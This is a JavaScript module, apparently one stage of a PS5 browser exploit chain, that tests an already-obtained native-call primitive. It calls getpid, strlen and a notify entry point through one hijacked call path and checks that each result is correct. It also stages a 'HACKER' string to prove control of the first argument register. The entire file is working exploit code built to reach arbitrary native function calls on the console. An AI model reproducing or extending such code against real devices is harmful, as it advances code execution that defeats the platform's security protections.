"use strict";

(function () {
    const STAGE = "generic-target-select-3";

    window.PS5GenericNativeProvider = {
        evaluate(ctx) {
            const mark = ctx.mark;
            const call = ctx.callNative;
            const r = {
                strlenOK: false, getpidOK: false, notifyOK: false,
                repeatOK: false, distinct: false, pass: false,
                targetSelectable: false, argumentsControlled: false,
                repeatable: false
            };

            // 1. getpid — target selection with rdi = 0.
            //    getpid returns the pid in rax; compareFn reads eax as the
            //    JS return value. pid fits in int32.
            try {
                const pid = call(ctx.getpidPointer);
                r.getpidOK = Number.isFinite(pid) && pid > 0;
                mark("GEN-TARGET-GETPID", `pid=${pid}-pass=${r.getpidOK}`);
            } catch (e) {
                mark("GEN-TARGET-GETPID-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
            }

            // 2. strlen on an arena-staged string with rdi control —
            //    proves BOTH a third distinct target and rdi argument
            //    control in one shot. rdx = 0xc30 is harmless: strlen
            //    stops at the NUL we wrote.
            try {
                const argAddr = ctx.stageAsciiArg(
                    [0x48, 0x41, 0x43, 0x4b, 0x45, 0x52, 0x00]); // "HACKER\0"
                const len = call(ctx.strlenPointer, argAddr);
                r.strlenOK = (len === 6);
                mark("GEN-TARGET-STRLEN", `len=${len}-expect=6-pass=${r.strlenOK}`
                    + `-arg=${hex(argAddr)}`);
            } catch (e) {
                mark("GEN-TARGET-STRLEN-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
            }

            // 3. notify regression — the slot must return to the fixed
            //    target and still behave like the original proof.
            try {
                const nret = call(ctx.notifyEntryAddress);
                r.notifyOK = (nret === 0);
                mark("GEN-TARGET-NOTIFY", `ret=${nret}-pass=${r.notifyOK}`);
            } catch (e) {
                mark("GEN-TARGET-NOTIFY-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
            }

            // 4. repeatability — getpid three times in a row.
            try {
                let ok = true;
                for (let i = 0; i < 3; ++i) {
                    const pid = call(ctx.getpidPointer);
                    if (!Number.isFinite(pid) || pid <= 0) { ok = false; break; }
                }
                r.repeatOK = ok;
                mark("GEN-REPEAT", `pass=${ok}`);
            } catch (e) {
                mark("GEN-REPEAT-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
            }

            // 5. distinctness — three different callees, one call path.
            r.distinct = new Set([
                ctx.getpidPointer, ctx.strlenPointer, ctx.notifyEntryAddress
            ]).size === 3;

            r.targetSelectable = r.getpidOK && r.strlenOK && r.notifyOK && r.distinct;
            r.argumentsControlled = r.strlenOK;          // rdi proven; rsi/rdx/... next gate
            r.repeatable = r.repeatOK && r.targetSelectable;
            r.pass = r.targetSelectable && r.repeatable;

            mark("GENERIC-TARGET-SELECT",
                `getpid=${r.getpidOK}-strlen=${r.strlenOK}-notify=${r.notifyOK}`
                + `-repeat=${r.repeatOK}-distinct=${r.distinct}-pass=${r.pass}`);
            return r;
        }
    };
})();
